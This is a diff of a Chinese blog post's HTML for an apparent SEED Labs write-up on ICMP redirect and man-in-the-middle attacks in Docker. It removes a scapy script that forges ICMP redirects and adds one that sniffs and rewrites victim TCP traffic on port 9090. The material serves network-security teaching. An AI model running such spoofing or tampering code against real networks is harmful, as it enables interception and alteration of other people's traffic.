@@ -384,7 +384,7 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker system prune -f
 </span></span></code></pre></td></tr></table>
 </div>
-</div><img src="1.png" style="width: 100%;" />
+</div><img src="1.png" style="width: 90%;" />
 <p>进入实验目录并启动</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -398,7 +398,7 @@ unicode: "f6d2"
 </div>
 </div><blockquote>
 <p>遇到问题：报错<code>Error response from daemon: interface specific sysctl setting &quot;net.ipv4.conf.eth0.send_redirects&quot; must be supplied using driver option 'com.docker.network.endpoint.sysctls'</code></p>
-<img src="2.png" style="width: 100%;" />
+<img src="2.png" style="width: 90%;" />
 <p>编辑<code>docker-compose.yml</code>，删除这一行</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -447,17 +447,17 @@ unicode: "f6d2"
       <tr>
           <td><strong>Docker 网关</strong></td>
           <td><code>10.9.0.1</code></td>
-          <td>Docker 虚拟网络的默认出口。在实验中通常不参与业务路由转发</td>
+          <td>Docker 虚拟网络的默认出口。在实验中不参与路由转发</td>
       </tr>
   </tbody>
 </table></div>
 <h2 id="icmp-重定向攻击">ICMP 重定向攻击
 </h2><p>ICMP Redirect 用于局域网优化路径。当主机将数据包发送给网关时，如果网关发现存在更优路径，会返回一个重定向报文，引导主机更新路由缓存，之后的数据包就会经过新的网关。这个机制缺乏认证过程，只要报文结构合法且来源看似可信，就有可能被内核接受，因此可以伪造重定向来进行攻击</p>
 <p>ICMP 重定向并不是无条件生效，需要存在对应的通信流量，否则内核可能直接忽略报文。路由缓存存在时间限制，实验操作需要在有效期内完成，否则需要重新触发攻击</p>
-<p><strong>攻击目标是修改受害者的路由缓存，让这个路由发往目标主机的流量途经恶意路由器</strong></p>
+<p><strong>攻击目标是修改受害者的路由缓存，让受害者发往目标主机的流量途经恶意路由器</strong></p>
 <h3 id="受害者">受害者
 </h3><blockquote>
-<p>ICMP 重定向并不是无条件生效，需要存在对应的通信流量，否则内核可能直接忽略报文，因此必须让受害者与目标主机报保持通信，这样重定向才有机会实行</p>
+<p>ICMP 重定向并不是无条件生效，需要存在对应的通信流量，否则内核可能直接忽略报文，因此必须让受害者与目标主机保持通信，这样重定向才有机会实行</p>
 </blockquote>
 <p>进入受害者容器，执行ping命令且不中断</p>
 <div class="highlight"><div class="chroma">
@@ -470,7 +470,7 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl">ping 192.168.60.5
 </span></span></code></pre></td></tr></table>
 </div>
-</div><img src="3.png" style="width: 100%;" />
+</div><img src="3.png" style="width: 70%;" />
 <h3 id="攻击者">攻击者
 </h3><blockquote>
 <p>攻击者需要伪造来自网关的 ICMP Type 5 Redirect 报文，告诉受害者访问目标时改走新的路由。需要满足两个条件：重定向报文必须伪装成网关发送，以及报文中必须包含受害者当前正在进行的通信信息。一般通过抓包监听，ARP 欺骗，局域网嗅探等获取此信息</p>
@@ -567,8 +567,8 @@ unicode: "f6d2"
 <li>第二行说明10.9.0.x 网段就在本地，不需要经过网关，可以直接发送</li>
 <li>第三行说明访问 192.168.60.x 网段时走静态路由10.9.0.11</li>
 </ul>
-<img src="4.png" style="width: 100%;" />
-<p>如果攻击成功，第三行应该显示的是10.9.0.111。攻击失败了，这是由于Docker中复杂的网络环境，以及现代Linux已经完全解决了这个漏洞，攻击会被拦截。因此手动添加路由进行模拟即可</p>
+<img src="4.png" style="width: 80%;" />
+<p>如果攻击成功，第三行应该显示的是10.9.0.111。攻击失败了，这是Docker中复杂的网络环境，以及现代Linux对ICMP重定向更严格的校验所导致，即使攻击报文成功发送，受害者也不一定更新缓存。因此手动添加路由进行模拟即可</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -601,7 +601,7 @@ unicode: "f6d2"
 </span></span></code></pre></td></tr></table>
 </div>
 </div><img src="6.png" style="width: 100%;" />
-<p>修改脚本中的攻击者ip为10.9.0.100，删除路由缓存后重新进行攻击，发现路由缓存没有变化，说明这条错误路由是写死在配置里的</p>
+<p>修改脚本中的攻击者ip为10.9.0.100，删除路由缓存后重新进行攻击，发现路由缓存没有变化，说明这个路由并不是更新的动态缓存，而是写在Docker配置里的静态路由</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -627,7 +627,7 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl">                      tail -f /dev/null
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>这一行说明真正的路由器其实是10.9.0.11，而不是我最初以为的10.9.0.1。修改脚本中的路由器ip为10.9.0.11，重新发包后还是没有用</p>
+</div><p>这里说明真正的路由器其实是10.9.0.11，而不是我最初以为的10.9.0.1。修改脚本中的路由器ip为10.9.0.11，重新发包后还是没有用</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -649,16 +649,17 @@ unicode: "f6d2"
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="发包">发包
-</h4><p>再次进行抓包，看到<code>10.9.0.5 &gt; 192.168.60.5: ICMP echo request, id 0, seq 0, length 8</code>。这句话表示攻击报文中嵌套的原始数据包片段，声明受害者10.9.0.5正在向目标192.168.60.5发送一个8字节的Ping请求，内核通过核对这段嵌套信息与自身发出的真实流量是否一致，来决定是否接受路由重定向。这里说明发出的包是正常的</p>
+</h4><p>再次进行抓包，<code>tcpdump -i eth0 -nn -vvv icmp</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tcpdump -i eth0 -nn -vvv icmp
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">10.9.0.5 &gt; 192.168.60.5: ICMP echo request, id 0, seq 0, length 8
 </span></span></code></pre></td></tr></table>
 </div>
-</div><img src="7.png" style="width: 100%;" />
+</div><p>这句话表示攻击报文中嵌套的原始数据包片段，声明受害者10.9.0.5正在向目标192.168.60.5发送一个8字节的Ping请求，内核通过核对这段嵌套信息与自身发出的真实流量是否一致，来决定是否接受路由重定向。这里说明发出的攻击包中确实附带了受害者最近的通信信息</p>
+<img src="7.png" style="width: 100%;" />
 <p>删除受害者的静态路由，ping直接断掉，尝试发包依旧没有用</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -668,14 +669,14 @@ unicode: "f6d2"
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip route del 192.168.60.0/24 via 10.9.0.11
 </span></span></code></pre></td></tr></table>
 </div>
-</div><img src="8.png" style="width: 100%;" />
-<p>验证攻击包到底有没有真的作用在受害者的网卡上，受害者执行下面的命令，输出<code>13:40:45.647101 IP 10.9.0.11 &gt; 10.9.0.5: ICMP redirect 192.168.60.5 to host 10.9.0.111, length 36</code>说明一切正常</p>
+</div><img src="8.png" style="width: 80%;" />
+<p>验证攻击包到底有没有真的作用在受害者的网卡上，受害者执行<code>tcpdump -i eth0 icmp -nn</code>，输出如下，说明一切正常</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">tcpdump -i eth0 icmp -nn
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">13:40:45.647101 IP 10.9.0.11 &gt; 10.9.0.5: ICMP redirect 192.168.60.5 to host 10.9.0.111, length 36
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>查看受害者内核计数器，<code>ICMP messages failed</code>为0，<code>ICMP redirects received</code>数量很多，说明大概率是内核拒绝了请求</p>
@@ -694,11 +695,7 @@ unicode: "f6d2"
 </span></span><span class="line"><span class="cl">sysctl -w net.ipv4.conf.all.rp_filter=0
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>还是失败了，又把最开始的<code>.11</code>添加回去，依旧不行</p>
-<p>内核会校验包中的ICMP 序列号和受害者流量是否一样。正常情况下应该写一个新的脚本，持续监听受害者的 ICMP 包，提取 <code>id</code> 和 <code>seq</code>并发出重定向，但尝试<code>tcpdump -i eth0 icmp</code>发现根本监听不到。这是由于 Docker 网桥的单播隔离特性，攻击者无法在不进行 ARP 欺骗的情况下监听到受害者的单播 ICMP 流量。说明实验确实无法正常完成</p>
-<blockquote>
-<p>之前tcpdump能抓到是因为抓的是攻击者发给受害者的包，这次受害者的ping包并不是发给攻击者，所以抓不到了</p>
-</blockquote>
+</div><p>还是失败了，又把最开始的<code>.11</code>添加回去，依旧不行，说明实验确实无法正常完成，只能进行模拟</p>
 <h2 id="中间人攻击">中间人攻击
 </h2><p>攻击的核心并不是重定向本身，而是通过重定向使流量经过攻击者，实现对流量的控制。此时攻击者已经处于通信路径中间，但默认情况下数据仍然是直接转发的，需要对数据进行拦截和修改</p>
 <h3 id="通信">通信
@@ -735,7 +732,16 @@ unicode: "f6d2"
 </div>
 </div><img src="10.png" style="width: 100%;" />
 <h3 id="攻击">攻击
-</h3><p>写一个中间人脚本<code>mitm_nc.py</code>，脚本通过嗅探并重构 TCP 数据，实现对通信内容的修改</p>
+</h3><p>进入脚本目录</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd /volumes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在恶意路由器写一个中间人脚本<code>mitm_nc.py</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -755,25 +761,81 @@ unicode: "f6d2"
 </span><span class="lnt">15
 </span><span class="lnt">16
 </span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">victim_ip</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.5&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">router_ip</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.11&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">attacker_ip</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.111&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="n">target_ip</span> <span class="o">=</span> <span class="s2">&#34;192.168.60.5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">VICTIM_IP</span> <span class="o">=</span> <span class="s2">&#34;10.9.0.5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">HOST_IP</span> <span class="o">=</span> <span class="s2">&#34;192.168.60.5&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 获取攻击者自身的 MAC，用于过滤</span>
+</span></span><span class="line"><span class="cl"><span class="n">MY_MAC</span> <span class="o">=</span> <span class="n">get_if_hwaddr</span><span class="p">(</span><span class="s2">&#34;eth0&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 构造受害者正在通信的数据包</span>
-</span></span><span class="line"><span class="cl"><span class="n">send_packet</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">victim_ip</span><span class="p">,</span><span class="n">dst</span><span class="o">=</span><span class="n">target_ip</span><span class="p">)</span> <span class="o">/</span> <span class="n">ICMP</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">spoof_pkt</span><span class="p">(</span><span class="n">pkt</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 过滤自身发送的数据包</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">MY_MAC</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 网关发给受害者一个ICMP重定向并附带数据包</span>
-</span></span><span class="line"><span class="cl"><span class="n">redirect</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="n">src</span><span class="o">=</span><span class="n">router_ip</span><span class="p">,</span> <span class="n">dst</span><span class="o">=</span><span class="n">victim_ip</span><span class="p">)</span> <span class="o">/</span> \
-</span></span><span class="line"><span class="cl">           <span class="n">ICMP</span><span class="p">(</span><span class="nb">type</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">gw</span><span class="o">=</span><span class="n">attacker_ip</span><span class="p">)</span> <span class="o">/</span> \
-</span></span><span class="line"><span class="cl">           <span class="n">send_packet</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 仅处理 TCP/IP 数据包和 9090 端口通信</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">IP</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">TCP</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">dport</span> <span class="o">!=</span> <span class="mi">9090</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">sport</span> <span class="o">!=</span> <span class="mi">9090</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 发送5次攻击报文</span>
-</span></span><span class="line"><span class="cl"><span class="n">send</span><span class="p">(</span><span class="n">redirect</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">5</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 受害者发给目标主机，拦截并篡改数据</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">VICTIM_IP</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">HOST_IP</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pkt</span><span class="o">.</span><span class="n">haslayer</span><span class="p">(</span><span class="n">Raw</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">pkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span>
+</span></span><span class="line"><span class="cl">            <span class="n">newdata</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">rb</span><span class="s1">&#39;[^\r\n]&#39;</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">newpkt</span><span class="p">[</span><span class="n">Raw</span><span class="p">]</span><span class="o">.</span><span class="n">load</span> <span class="o">=</span> <span class="n">newdata</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">send</span><span class="p">(</span><span class="n">newpkt</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 目标主机发给受害者，正常转发返回流量</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">src</span> <span class="o">==</span> <span class="n">HOST_IP</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]</span><span class="o">.</span><span class="n">dst</span> <span class="o">==</span> <span class="n">VICTIM_IP</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">newpkt</span> <span class="o">=</span> <span class="n">IP</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">pkt</span><span class="p">[</span><span class="n">IP</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">del</span><span class="p">(</span><span class="n">newpkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">]</span><span class="o">.</span><span class="n">chksum</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">send</span><span class="p">(</span><span class="n">newpkt</span><span class="p">,</span> <span class="n">verbose</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 抓取 Victim 与 Host 间的 9090 TCP 流量</span>
+</span></span><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;tcp and port 9090 and (host </span><span class="si">{</span><span class="n">VICTIM_IP</span><span class="si">}</span><span class="s1"> and host </span><span class="si">{</span><span class="n">HOST_IP</span><span class="si">}</span><span class="s1">)&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sniff</span><span class="p">(</span><span class="n">iface</span><span class="o">=</span><span class="s2">&#34;eth0&#34;</span><span class="p">,</span><span class="nb">filter</span><span class="o">=</span><span class="n">f</span><span class="p">,</span><span class="n">prn</span><span class="o">=</span><span class="n">spoof_pkt</span><span class="p">,</span><span class="n">store</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>运行中间人脚本</p>
@@ -786,25 +848,8 @@ unicode: "f6d2"
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="验证-1">验证
-</h3><p>在受害者端发送特定字符串，例如：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">seedlabs
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>目标主机接收到的内容被替换为：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AAAAAAAA
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>说明数据已在传输过程中被修改，中间人攻击成立</p>
+</h3><p>在受害者端发送任意字符串，目标主机接收到的内容被替换为相同长度的<code>A</code>，这说明数据已在传输过程中被修改</p>
+<img src="11.png" style="width: 50%;" />
 
 </section>
 
@@ -1176,7 +1221,7 @@ unicode: "f6d2"
       共发表文章 
       <span class="number-highlight">25</span> 
       篇 ，总计 
-      <span class="number-highlight">94.86</span> 
+      <span class="number-highlight">93.02</span> 
       k 字
   </div>
   <div>
